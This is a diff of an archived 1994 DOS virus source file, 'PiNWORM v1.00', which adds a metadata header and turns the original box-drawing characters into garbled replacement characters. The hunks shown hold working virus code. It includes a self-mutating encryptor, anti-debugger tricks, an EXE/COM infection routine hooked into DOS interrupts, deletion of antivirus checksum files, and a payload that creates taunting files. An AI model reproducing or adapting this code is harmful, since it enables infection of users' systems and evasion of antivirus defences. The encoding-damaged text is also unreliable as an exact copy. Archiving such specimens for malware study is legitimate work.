@@ -1,8 +1,19 @@
+; ------------------------------------------------------------
+; name      P
+; type      asm
+; cve       â€”
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     â€”
+; ------------------------------------------------------------
 ;
-;   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ------
-;    PiïWéRM v1.00 coded by ûirogen
-;      ş Original Varient
-;   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ------
+;   ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½------
+;    Piï¿½Wï¿½RM v1.00 coded by ï¿½irogen
+;      ï¿½ Original Varient
+;   ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½------
 ;
 ;  See enclosed NFO for more info..
 ;
@@ -53,7 +64,7 @@ real_start equ  offset dj_buf+3         ; starting location of encryted code
 org     0h                              ; hellacious EXE offset calcs if !0
 start:
 
-;ÄÄÄÄ Encryptor/Decryptor Location
+;ï¿½ï¿½ï¿½ï¿½ Encryptor/Decryptor Location
 ; Each opcode has predefined ranges to move within - once the opcode is
 ; determined, it is placed at the decided location within the buffer.
 ; 0 bytes constant
@@ -79,22 +90,22 @@ start:
 first_crypt:                            ; end of first cryptor
 
 
-;ÄÄÄÄ Second encryptor
+;ï¿½ï¿½ï¿½ï¿½ Second encryptor
 ; Whose only purpose is to tear the shit out of debuggers. It obviously
 ; isn't invincible, but will at least keep the lamerz and ignorant morons
 ; like Patti Hoffman out of the code.
 ;
-; ş Uses reverse direction word XOR encryption
-; ş Uses the following techniques:
-;    ğ JMP into middle of operand
-;    ğ Replace word after CALL to kill stepping over call
-;    ğ Kills INT 1 vector
-;    ğ Disables Keyboard via Port 21h
-;    ğ Reverse direction encryption prevents stepping past loop
-;    ğ Uses SP as a crucial data register in some locations - if
+; ï¿½ Uses reverse direction word XOR encryption
+; ï¿½ Uses the following techniques:
+;    ï¿½ JMP into middle of operand
+;    ï¿½ Replace word after CALL to kill stepping over call
+;    ï¿½ Kills INT 1 vector
+;    ï¿½ Disables Keyboard via Port 21h
+;    ï¿½ Reverse direction encryption prevents stepping past loop
+;    ï¿½ Uses SP as a crucial data register in some locations - if
 ;      the debugger uses the program's stack, then it may very well
 ;      phuck thingz up nicely.
-;    ğ Uses Soft-Ice INT 3 API to lock it up if in memory.
+;    ï¿½ Uses Soft-Ice INT 3 API to lock it up if in memory.
 ;
         sti                             ; fix CLI in garbage code
         db      0BDh                    ; MOV BP,XXXX
@@ -178,7 +189,7 @@ dec_si: pop     ss                      ; fuck 'em if they skipped shit2
         jnz     dbl_loop
 ret2_byte db    90h,90h
 
-;ÄÄÄÄ Start of another artificial lifeform
+;ï¿½ï¿½ï¿½ï¿½ Start of another artificial lifeform
 
 ENDIF
 code_start:
@@ -268,7 +279,7 @@ exe_jump dd     0
 oldsp   dw      0
 exe_phile db    0
 
-;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+;ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 ; Infection routine - called from INT 21h handler.
 ;    DS:DX=fname
 ;      Assumes EXE if first byte is 'M' or 'Z'
@@ -492,7 +503,7 @@ write_hdr:
         jmp     d_time                  ; restore shit/return
 
 
-;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+;ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 ; Kill CHKLIST.* filez by nulling attribs, then deleting
 ; phile.
 ;
@@ -512,7 +523,7 @@ kill_loop:
 
         ret
 
-;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+;ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 ; set file ptr
 
 offset_zero:                            ; self explanitory
@@ -527,7 +538,7 @@ set_fp:
         int     21h
         ret
 
-;-ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ--
+;-ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½--
 ; Morph, copy, & crypt
 ;
 ;  0 bytes constant
@@ -551,13 +562,13 @@ encrypt_code:
 
         push    bx                      ; save the handle
 
-;ÄÄÄÄ Fill buffer space with garbage bytes
+;ï¿½ï¿½ï¿½ï¿½ Fill buffer space with garbage bytes
 
         lea     di,encrypt              ; fill buffer /w it
         mov     bp,enc_size+1
         call    fill_buffer
 
-;ÄÄÄÄ Randomly select between jmp type : JNZ or JNS
+;ï¿½ï¿½ï¿½ï¿½ Randomly select between jmp type : JNZ or JNS
 
         call    get_random
         mov     enc_num,dl              ; store ms count for encryption
@@ -572,7 +583,7 @@ encrypt_code:
         mov     byte ptr jnz_op,79h     ; jns
         jmp_set:
 
-;ÄÄÄÄ Change jump address
+;ï¿½ï¿½ï¿½ï¿½ Change jump address
 
         cmp     byte ptr jnz_op+1,org_loop+loop_disp_size ; JNX on max offset?
         jnz     inc_jmp_ofs             ; if not then inc the ptr
@@ -580,7 +591,7 @@ encrypt_code:
         inc_jmp_ofs:
         inc     byte ptr jnz_op+1       ; increment jmp into buffer
 
-;ÄÄÄÄ Change encryption type randomly between XOR and ADD&SUB
+;ï¿½ï¿½ï¿½ï¿½ Change encryption type randomly between XOR and ADD&SUB
 
         mov     al,04                   ; default to encrypting ADD
         mov     enc_type,2Ch            ; and decrypting SUB
@@ -590,7 +601,7 @@ encrypt_code:
         mov     enc_type,34h            ; decrypting XOR
         use_add_sub:
 
-;ÄÄÄ Change register used for the counter
+;ï¿½ï¿½ï¿½ Change register used for the counter
 
         cmp     byte ptr count_op,0BBh  ; skip SP/BP/DI/SI
         jnz     get_reg
@@ -600,7 +611,7 @@ encrypt_code:
         inc     byte ptr count_op       ; increment to next OP
         inc     byte ptr dec_op         ; ""
 
-;ÄÄÄÄ Change position of INC XX
+;ï¿½ï¿½ï¿½ï¿½ Change position of INC XX
 
         mov     di,inc_ptr              ; get new off for INC XX
         cmp     di,inc_buf_size         ; max position?
@@ -610,7 +621,7 @@ encrypt_code:
         good_inc:
         inc     inc_ptr                 ; increment the ptr for next
 
-;ÄÄÄÄ Toggle between SI and DI
+;ï¿½ï¿½ï¿½ï¿½ Toggle between SI and DI
 
         cmp     byte ptr ptr_set,0BEh   ; using SI?
         jz      chg_di                  ; if so, then switch to DI
@@ -624,7 +635,7 @@ encrypt_code:
         inc     ax                      ; increment encryptor
         done_chg_ptr:
 
-;ÄÄÄÄ Select word or byte encryption
+;ï¿½ï¿½ï¿½ï¿½ Select word or byte encryption
 
         mov     w_b,80h                 ; default to byte cryption
         test    dl,00000001b            ; use word?
@@ -634,7 +645,7 @@ encrypt_code:
         mov     byte ptr word_inc,ch    ; write another one
         use_byte:
 
-;ÄÄÄÄ Increment counter value
+;ï¿½ï¿½ï¿½ï¿½ Increment counter value
 
         cmp     byte ptr crypt_bytes,0Fh ; byte count quite large?
         jnz     inc_cnt                 ; if not..increment away
@@ -643,7 +654,7 @@ encrypt_code:
         inc     crypt_bytes             ; increment byte count
 
 
-;ÄÄÄÄ Set DEC XX /JNS|JNZ operands
+;ï¿½ï¿½ï¿½ï¿½ Set DEC XX /JNS|JNZ operands
 
         mov     di,dec_op_ptr
         cmp     di,dj_buf_size-2
@@ -661,7 +672,7 @@ encrypt_code:
         add     rel_off,di              ;chg offset for decryption
         push    di                      ;save offset after jmp
 
-;ÄÄÄÄ Set MOV DI,XXXX|MOV SI,XXXX
+;ï¿½ï¿½ï¿½ï¿½ Set MOV DI,XXXX|MOV SI,XXXX
 
         mov     di,ptr_op_ptr
         cmp     di,ptr_buf_size-3
@@ -678,7 +689,7 @@ encrypt_code:
         movsw
         movsb
 
-;ÄÄÄÄ Set MOV AX|BX|DX|CX,XXXX
+;ï¿½ï¿½ï¿½ï¿½ Set MOV AX|BX|DX|CX,XXXX
 
         mov     di,count_op_ptr
         cmp     di,cnt_buf_size-3
@@ -695,7 +706,7 @@ encrypt_code:
         movsw
         movsb
 
-;ÄÄÄÄ Set XOR|ADD&SUB WORD|BYTE CS:|DS:[SI|DI],XX|XXXX
+;ï¿½ï¿½ï¿½ï¿½ Set XOR|ADD&SUB WORD|BYTE CS:|DS:[SI|DI],XX|XXXX
 
         mov     di,enc_op_ptr
         cmp     di,enc_op_bsize-5
@@ -713,13 +724,13 @@ encrypt_code:
         movsw
         movsw
 
-;ÄÄÄÄ FiX second cryptor offset
+;ï¿½ï¿½ï¿½ï¿½ FiX second cryptor offset
 
 IF SECOND_CRYPT
         mov     rel2_off,offset heap    ;first gen has mispl. off
 ENDIF
 
-;ÄÄÄÄ Copy virus code along with decryptor to heap
+;ï¿½ï¿½ï¿½ï¿½ Copy virus code along with decryptor to heap
 
         mov     cx, (offset heap-offset start)/2+1
         xor     si,si
@@ -727,7 +738,7 @@ ENDIF
         rep     movsw                   ; make another copy of virus
 
 IF SECOND_CRYPT
-;ÄÄÄÄ Call second encryptor first
+;ï¿½ï¿½ï¿½ï¿½ Call second encryptor first
 
         mov     si,offset vend          ; offset of enc. start..
         add     si,offset heap          ; ..at end of code
@@ -739,13 +750,13 @@ IF SECOND_CRYPT
         mov     ret2_byte,90h
 ENDIF
 
-;ÄÄÄÄ Set ptr to heap for encryption
+;ï¿½ï¿½ï¿½ï¿½ Set ptr to heap for encryption
 
         pop     si                      ; pop offset after jmp
         add     si,offset vend          ; offset we'z bez encrypting
         mov     di,si                   ; we might be using DI too
 
-;ÄÄÄÄ Encrypt the mother fucker
+;ï¿½ï¿½ï¿½ï¿½ Encrypt the mother fucker
 
         mov     ret_byte,0C3h           ; put RET
         mov     byte ptr [bx+2],al      ; set encryption type
@@ -754,7 +765,7 @@ ENDIF
         pop     bx                      ; restore phile handle
         ret                             ; return
 
-;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+;ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 ; Fill buffer with random garbage from table
 ;  DI=off BP=size
 ;  ret: BL=last garbage byte
@@ -786,7 +797,7 @@ constant: mov   si,dx                   ; build index ptr
         dec     bp
         jnz     fill_buffer             ; loop
         ret
-;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+;ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 ; get time man - and use it as semi-random word
 ;
 get_random:
@@ -794,27 +805,27 @@ get_random:
         int     21h
         ret
 
-;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+;ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 ; Associated bullshit
 ;
-credits db      ' ş PIïWérMÿv1.00 - Coded by ûirogen in April 1994'
+credits db      ' ï¿½ PIï¿½Wï¿½rMï¿½v1.00 - Coded by ï¿½irogen in April 1994'
 chkl1   db      'CHKLIST.MS',0          ; MSAV shitty checksum
 chkl2   db      'CHKLIST.CPS',0         ; CPAV shitty checksum
-pin_dir db      255,'PIïWérM.ûg!',0     ; DIR created
+pin_dir db      255,'PIï¿½Wï¿½rM.ï¿½g!',0     ; DIR created
 root    db      '..',0                  ; for changing to org. dir
-file1   db      'Iÿhopeÿy',0            ; filez created in dir..
-        db      'ouÿhaveÿ',0            ; must be 8 chars each+null
-        db      'enjoyedÿ',0            ; (255 not space)
-        db      'yourÿinf',0
+file1   db      'Iï¿½hopeï¿½y',0            ; filez created in dir..
+        db      'ouï¿½haveï¿½',0            ; must be 8 chars each+null
+        db      'enjoyedï¿½',0            ; (255 not space)
+        db      'yourï¿½inf',0
         db      'estation',0
-        db      'ÿbyÿtheÿ',0
+        db      'ï¿½byï¿½theï¿½',0
         db      'mighty P',0
         db      'inworm p',0
-        db      'arasiteú',0
-        db      'úúúúúúúú',0
-        db      'Fuckÿyou',0
-        db      'all!ÿÿÿÿ',0
-        db      '-ûirogen',0            ; #13
+        db      'arasiteï¿½',0
+        db      'ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½',0
+        db      'Fuckï¿½you',0
+        db      'all!ï¿½ï¿½ï¿½ï¿½',0
+        db      '-ï¿½irogen',0            ; #13
 new_jmp db      0E9h,0,0,0              ; jmp XXXX ,0 (id)
 inc_ptr dw      0                       ; ptr to location of INC
 enc_op_ptr dw   0                       ; actual ENC op ptr
@@ -864,7 +875,7 @@ ELSE
 ENDIF
 
 
-;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+;ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 ; activation routine
 ;
 act_routine:
@@ -907,14 +918,14 @@ r_no:
         pop     es bp dx ds cx bx ax
         jmp     no_act
 
-;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+;ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 ; Interrupt 24h - critical error handler
 ;
 new_24:                                 ; critical error handler
         mov     al,3                    ; prompts suck, return fail
         iret
 
-;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+;ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 ; In-memory encryption function
 ;  **virus encrypted in memory up to this point**
 ;
@@ -928,7 +939,7 @@ mem_word dw     0                       ;XXXX
         loop    mem_loop
         ret
 
-;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+;ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 ; Interrupt 21h
 ;  returns SI=0 and passes control to normal handler if
 ;   VSAFE uninstall command is recieved.
@@ -965,7 +976,7 @@ go_now: push    ax bp bx cx di dx ds es si
 
 exe_header:
 org_bytes db    0CDh,20h,0,0            ; original COM bytes | exe hdr
-;ÄÄÄÄ Start of heap (not written to disk)
+;ï¿½ï¿½ï¿½ï¿½ Start of heap (not written to disk)
 heap:
 db      14h     dup(0)                  ; remaining exe header space
 old_24_off dw   0                       ; old int24h vector
